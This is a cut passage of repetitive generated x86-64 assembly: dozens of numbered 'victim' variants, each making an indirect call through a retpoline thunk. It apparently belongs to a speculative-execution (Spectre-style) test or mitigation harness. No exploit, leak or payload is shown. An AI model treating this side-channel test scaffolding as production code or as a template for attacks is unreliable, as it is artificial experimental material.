	jmp	.Lgg_retpol_after_000574
.Lgg_retpol_thunk_000574:
	callq	.Lgg_retpol_setup_000574
.Lgg_retpol_cap_000574:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000574
.Lgg_retpol_setup_000574:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000574:
	jmp	.Lvictim_win0_continue
## Variant 575
.Lvictim_win0_var575:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000575
	jmp	.Lgg_retpol_after_000575
.Lgg_retpol_thunk_000575:
	callq	.Lgg_retpol_setup_000575
.Lgg_retpol_cap_000575:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000575
.Lgg_retpol_setup_000575:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000575:
	jmp	.Lvictim_win0_continue
## Variant 576
.Lvictim_win0_var576:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000576
	jmp	.Lgg_retpol_after_000576
.Lgg_retpol_thunk_000576:
	callq	.Lgg_retpol_setup_000576
.Lgg_retpol_cap_000576:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000576
.Lgg_retpol_setup_000576:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000576:
	jmp	.Lvictim_win0_continue
## Variant 577
.Lvictim_win0_var577:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000577
	jmp	.Lgg_retpol_after_000577
.Lgg_retpol_thunk_000577:
	callq	.Lgg_retpol_setup_000577
.Lgg_retpol_cap_000577:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000577
.Lgg_retpol_setup_000577:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000577:
	jmp	.Lvictim_win0_continue
## Variant 578
.Lvictim_win0_var578:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000578
	jmp	.Lgg_retpol_after_000578
.Lgg_retpol_thunk_000578:
	callq	.Lgg_retpol_setup_000578
.Lgg_retpol_cap_000578:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000578
.Lgg_retpol_setup_000578:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000578:
	jmp	.Lvictim_win0_continue
## Variant 579
.Lvictim_win0_var579:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000579
	jmp	.Lgg_retpol_after_000579
.Lgg_retpol_thunk_000579:
	callq	.Lgg_retpol_setup_000579
.Lgg_retpol_cap_000579:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000579
.Lgg_retpol_setup_000579:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000579:
	jmp	.Lvictim_win0_continue
## Variant 580
.Lvictim_win0_var580:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000580
	jmp	.Lgg_retpol_after_000580
.Lgg_retpol_thunk_000580:
	callq	.Lgg_retpol_setup_000580
.Lgg_retpol_cap_000580:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000580
.Lgg_retpol_setup_000580:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000580:
	jmp	.Lvictim_win0_continue
## Variant 581
.Lvictim_win0_var581:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000581
	jmp	.Lgg_retpol_after_000581
.Lgg_retpol_thunk_000581:
	callq	.Lgg_retpol_setup_000581
.Lgg_retpol_cap_000581:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000581
.Lgg_retpol_setup_000581:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000581:
	jmp	.Lvictim_win0_continue
## Variant 582
.Lvictim_win0_var582:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000582
	jmp	.Lgg_retpol_after_000582
.Lgg_retpol_thunk_000582:
	callq	.Lgg_retpol_setup_000582
.Lgg_retpol_cap_000582:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000582
.Lgg_retpol_setup_000582:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000582:
	jmp	.Lvictim_win0_continue
## Variant 583
.Lvictim_win0_var583:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000583
	jmp	.Lgg_retpol_after_000583
.Lgg_retpol_thunk_000583:
	callq	.Lgg_retpol_setup_000583
.Lgg_retpol_cap_000583:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000583
.Lgg_retpol_setup_000583:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000583:
	jmp	.Lvictim_win0_continue
## Variant 584
.Lvictim_win0_var584:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000584
	jmp	.Lgg_retpol_after_000584
.Lgg_retpol_thunk_000584:
	callq	.Lgg_retpol_setup_000584
.Lgg_retpol_cap_000584:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000584
.Lgg_retpol_setup_000584:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000584:
	jmp	.Lvictim_win0_continue
## Variant 585
.Lvictim_win0_var585:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000585
	jmp	.Lgg_retpol_after_000585
.Lgg_retpol_thunk_000585:
	callq	.Lgg_retpol_setup_000585
.Lgg_retpol_cap_000585:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000585
.Lgg_retpol_setup_000585:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000585:
	jmp	.Lvictim_win0_continue
## Variant 586
.Lvictim_win0_var586:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000586
	jmp	.Lgg_retpol_after_000586
.Lgg_retpol_thunk_000586:
	callq	.Lgg_retpol_setup_000586
.Lgg_retpol_cap_000586:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000586
.Lgg_retpol_setup_000586:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000586:
	jmp	.Lvictim_win0_continue
## Variant 587
.Lvictim_win0_var587:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000587
	jmp	.Lgg_retpol_after_000587
.Lgg_retpol_thunk_000587:
	callq	.Lgg_retpol_setup_000587
.Lgg_retpol_cap_000587:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000587
.Lgg_retpol_setup_000587:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000587:
	jmp	.Lvictim_win0_continue
## Variant 588
.Lvictim_win0_var588:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000588
	jmp	.Lgg_retpol_after_000588
.Lgg_retpol_thunk_000588:
	callq	.Lgg_retpol_setup_000588
.Lgg_retpol_cap_000588:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000588
.Lgg_retpol_setup_000588:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000588:
	jmp	.Lvictim_win0_continue
## Variant 589
.Lvictim_win0_var589:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000589
	jmp	.Lgg_retpol_after_000589
.Lgg_retpol_thunk_000589:
	callq	.Lgg_retpol_setup_000589
.Lgg_retpol_cap_000589:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000589
.Lgg_retpol_setup_000589:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000589:
	jmp	.Lvictim_win0_continue
## Variant 590
.Lvictim_win0_var590:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000590
	jmp	.Lgg_retpol_after_000590
.Lgg_retpol_thunk_000590:
	callq	.Lgg_retpol_setup_000590
.Lgg_retpol_cap_000590:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000590
.Lgg_retpol_setup_000590:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000590:
	jmp	.Lvictim_win0_continue
## Variant 591
.Lvictim_win0_var591:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000591
	jmp	.Lgg_retpol_after_000591
.Lgg_retpol_thunk_000591:
	callq	.Lgg_retpol_setup_000591
.Lgg_retpol_cap_000591:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000591
.Lgg_retpol_setup_000591:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000591:
	jmp	.Lvictim_win0_continue
## Variant 592
.Lvictim_win0_var592:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000592
	jmp	.Lgg_retpol_after_000592
.Lgg_retpol_thunk_000592:
	callq	.Lgg_retpol_setup_000592
.Lgg_retpol_cap_000592:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000592
.Lgg_retpol_setup_000592:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000592:
	jmp	.Lvictim_win0_continue
## Variant 593
.Lvictim_win0_var593:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000593
	jmp	.Lgg_retpol_after_000593
.Lgg_retpol_thunk_000593:
	callq	.Lgg_retpol_setup_000593
.Lgg_retpol_cap_000593:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000593
.Lgg_retpol_setup_000593:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000593:
	jmp	.Lvictim_win0_continue
## Variant 594
.Lvictim_win0_var594:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000594
	jmp	.Lgg_retpol_after_000594
.Lgg_retpol_thunk_000594:
	callq	.Lgg_retpol_setup_000594
.Lgg_retpol_cap_000594:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000594
.Lgg_retpol_setup_000594:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000594:
	jmp	.Lvictim_win0_continue
## Variant 595
.Lvictim_win0_var595:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000595
	jmp	.Lgg_retpol_after_000595
.Lgg_retpol_thunk_000595:
	callq	.Lgg_retpol_setup_000595
.Lgg_retpol_cap_000595:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000595
.Lgg_retpol_setup_000595:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000595:
	jmp	.Lvictim_win0_continue
## Variant 596
.Lvictim_win0_var596:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000596
	jmp	.Lgg_retpol_after_000596
.Lgg_retpol_thunk_000596:
	callq	.Lgg_retpol_setup_000596
.Lgg_retpol_cap_000596:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000596
.Lgg_retpol_setup_000596:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000596:
	jmp	.Lvictim_win0_continue
## Variant 597
.Lvictim_win0_var597:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000597
	jmp	.Lgg_retpol_after_000597
.Lgg_retpol_thunk_000597:
	callq	.Lgg_retpol_setup_000597
.Lgg_retpol_cap_000597:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000597
.Lgg_retpol_setup_000597:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000597:
	jmp	.Lvictim_win0_continue
## Variant 598
.Lvictim_win0_var598:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000598
	jmp	.Lgg_retpol_after_000598
.Lgg_retpol_thunk_000598:
	callq	.Lgg_retpol_setup_000598
.Lgg_retpol_cap_000598:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000598
.Lgg_retpol_setup_000598:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000598:
	jmp	.Lvictim_win0_continue
## Variant 599
.Lvictim_win0_var599:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000599
	jmp	.Lgg_retpol_after_000599
.Lgg_retpol_thunk_000599:
	callq	.Lgg_retpol_setup_000599
.Lgg_retpol_cap_000599:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000599
.Lgg_retpol_setup_000599:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000599:
	jmp	.Lvictim_win0_continue
## Variant 600
.Lvictim_win0_var600:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000600
	jmp	.Lgg_retpol_after_000600
.Lgg_retpol_thunk_000600:
	callq	.Lgg_retpol_setup_000600
.Lgg_retpol_cap_000600:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000600
.Lgg_retpol_setup_000600:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000600:
	jmp	.Lvictim_win0_continue
## Variant 601
.Lvictim_win0_var601:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000601
	jmp	.Lgg_retpol_after_000601
.Lgg_retpol_thunk_000601:
	callq	.Lgg_retpol_setup_000601
.Lgg_retpol_cap_000601:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000601
.Lgg_retpol_setup_000601:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000601:
	jmp	.Lvictim_win0_continue
## Variant 602
.Lvictim_win0_var602:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000602
	jmp	.Lgg_retpol_after_000602
.Lgg_retpol_thunk_000602:
	callq	.Lgg_retpol_setup_000602
.Lgg_retpol_cap_000602:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000602
.Lgg_retpol_setup_000602:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000602:
	jmp	.Lvictim_win0_continue
## Variant 603
.Lvictim_win0_var603:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000603
	jmp	.Lgg_retpol_after_000603
.Lgg_retpol_thunk_000603:
	callq	.Lgg_retpol_setup_000603
.Lgg_retpol_cap_000603:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000603
.Lgg_retpol_setup_000603:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000603:
	jmp	.Lvictim_win0_continue
## Variant 604
.Lvictim_win0_var604:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000604
	jmp	.Lgg_retpol_after_000604
.Lgg_retpol_thunk_000604:
	callq	.Lgg_retpol_setup_000604
.Lgg_retpol_cap_000604:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000604
.Lgg_retpol_setup_000604:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000604:
	jmp	.Lvictim_win0_continue
## Variant 605
.Lvictim_win0_var605:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000605
	jmp	.Lgg_retpol_after_000605
.Lgg_retpol_thunk_000605:
	callq	.Lgg_retpol_setup_000605
.Lgg_retpol_cap_000605:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000605
.Lgg_retpol_setup_000605:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000605:
	jmp	.Lvictim_win0_continue
## Variant 606
.Lvictim_win0_var606:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000606
	jmp	.Lgg_retpol_after_000606
.Lgg_retpol_thunk_000606:
	callq	.Lgg_retpol_setup_000606
.Lgg_retpol_cap_000606:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000606
.Lgg_retpol_setup_000606:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000606:
	jmp	.Lvictim_win0_continue
## Variant 607
.Lvictim_win0_var607:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000607
	jmp	.Lgg_retpol_after_000607
.Lgg_retpol_thunk_000607:
	callq	.Lgg_retpol_setup_000607
.Lgg_retpol_cap_000607:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000607
.Lgg_retpol_setup_000607:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000607:
	jmp	.Lvictim_win0_continue
## Variant 608
.Lvictim_win0_var608:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000608
	jmp	.Lgg_retpol_after_000608
.Lgg_retpol_thunk_000608:
	callq	.Lgg_retpol_setup_000608
.Lgg_retpol_cap_000608:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000608
.Lgg_retpol_setup_000608:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000608:
	jmp	.Lvictim_win0_continue
## Variant 609
.Lvictim_win0_var609:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000609
	jmp	.Lgg_retpol_after_000609
.Lgg_retpol_thunk_000609:
	callq	.Lgg_retpol_setup_000609
.Lgg_retpol_cap_000609:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000609
.Lgg_retpol_setup_000609:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000609:
	jmp	.Lvictim_win0_continue
## Variant 610
.Lvictim_win0_var610:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000610
	jmp	.Lgg_retpol_after_000610
.Lgg_retpol_thunk_000610:
	callq	.Lgg_retpol_setup_000610
.Lgg_retpol_cap_000610:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000610
.Lgg_retpol_setup_000610:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000610:
	jmp	.Lvictim_win0_continue
## Variant 611
.Lvictim_win0_var611:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000611
	jmp	.Lgg_retpol_after_000611
.Lgg_retpol_thunk_000611:
	callq	.Lgg_retpol_setup_000611
.Lgg_retpol_cap_000611:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000611
.Lgg_retpol_setup_000611:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000611:
	jmp	.Lvictim_win0_continue
## Variant 612
.Lvictim_win0_var612:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000612
	jmp	.Lgg_retpol_after_000612
.Lgg_retpol_thunk_000612:
	callq	.Lgg_retpol_setup_000612
.Lgg_retpol_cap_000612:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000612
.Lgg_retpol_setup_000612:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000612:
	jmp	.Lvictim_win0_continue
## Variant 613
.Lvictim_win0_var613:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000613
	jmp	.Lgg_retpol_after_000613
.Lgg_retpol_thunk_000613:
	callq	.Lgg_retpol_setup_000613
.Lgg_retpol_cap_000613:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000613
.Lgg_retpol_setup_000613:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000613:
	jmp	.Lvictim_win0_continue
## Variant 614
.Lvictim_win0_var614:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000614
	jmp	.Lgg_retpol_after_000614
.Lgg_retpol_thunk_000614:
	callq	.Lgg_retpol_setup_000614
.Lgg_retpol_cap_000614:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000614
.Lgg_retpol_setup_000614:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000614:
	jmp	.Lvictim_win0_continue
## Variant 615
.Lvictim_win0_var615:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000615
	jmp	.Lgg_retpol_after_000615
.Lgg_retpol_thunk_000615:
	callq	.Lgg_retpol_setup_000615
.Lgg_retpol_cap_000615:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000615
.Lgg_retpol_setup_000615:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000615:
	jmp	.Lvictim_win0_continue
## Variant 616
.Lvictim_win0_var616:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000616
	jmp	.Lgg_retpol_after_000616
.Lgg_retpol_thunk_000616:
	callq	.Lgg_retpol_setup_000616
.Lgg_retpol_cap_000616:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000616
.Lgg_retpol_setup_000616:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000616:
	jmp	.Lvictim_win0_continue
## Variant 617
.Lvictim_win0_var617:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000617
	jmp	.Lgg_retpol_after_000617
.Lgg_retpol_thunk_000617:
	callq	.Lgg_retpol_setup_000617
.Lgg_retpol_cap_000617:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000617
.Lgg_retpol_setup_000617:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000617:
	jmp	.Lvictim_win0_continue
## Variant 618
.Lvictim_win0_var618:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000618
	jmp	.Lgg_retpol_after_000618
.Lgg_retpol_thunk_000618:
	callq	.Lgg_retpol_setup_000618
.Lgg_retpol_cap_000618:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000618
.Lgg_retpol_setup_000618:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000618:
	jmp	.Lvictim_win0_continue
## Variant 619
.Lvictim_win0_var619:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000619
	jmp	.Lgg_retpol_after_000619
.Lgg_retpol_thunk_000619:
	callq	.Lgg_retpol_setup_000619
.Lgg_retpol_cap_000619:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000619
.Lgg_retpol_setup_000619:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000619:
	jmp	.Lvictim_win0_continue
## Variant 620
.Lvictim_win0_var620:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000620
	jmp	.Lgg_retpol_after_000620
.Lgg_retpol_thunk_000620:
	callq	.Lgg_retpol_setup_000620
.Lgg_retpol_cap_000620:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000620
.Lgg_retpol_setup_000620:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000620:
	jmp	.Lvictim_win0_continue
## Variant 621
.Lvictim_win0_var621:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000621
	jmp	.Lgg_retpol_after_000621
.Lgg_retpol_thunk_000621:
	callq	.Lgg_retpol_setup_000621
.Lgg_retpol_cap_000621:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000621
.Lgg_retpol_setup_000621:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000621:
	jmp	.Lvictim_win0_continue
## Variant 622
.Lvictim_win0_var622:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000622
	jmp	.Lgg_retpol_after_000622
.Lgg_retpol_thunk_000622:
	callq	.Lgg_retpol_setup_000622
.Lgg_retpol_cap_000622:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000622
.Lgg_retpol_setup_000622:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000622:
	jmp	.Lvictim_win0_continue
## Variant 623
.Lvictim_win0_var623:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000623
	jmp	.Lgg_retpol_after_000623
.Lgg_retpol_thunk_000623:
	callq	.Lgg_retpol_setup_000623
.Lgg_retpol_cap_000623:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000623
.Lgg_retpol_setup_000623:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000623:
	jmp	.Lvictim_win0_continue
## Variant 624
.Lvictim_win0_var624:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000624
	jmp	.Lgg_retpol_after_000624
.Lgg_retpol_thunk_000624:
	callq	.Lgg_retpol_setup_000624
.Lgg_retpol_cap_000624:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000624
.Lgg_retpol_setup_000624:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000624:
	jmp	.Lvictim_win0_continue
## Variant 625
.Lvictim_win0_var625:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000625
	jmp	.Lgg_retpol_after_000625
.Lgg_retpol_thunk_000625:
	callq	.Lgg_retpol_setup_000625
.Lgg_retpol_cap_000625:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000625
.Lgg_retpol_setup_000625:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000625:
	jmp	.Lvictim_win0_continue
## Variant 626
.Lvictim_win0_var626:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000626
	jmp	.Lgg_retpol_after_000626
.Lgg_retpol_thunk_000626:
	callq	.Lgg_retpol_setup_000626
.Lgg_retpol_cap_000626:
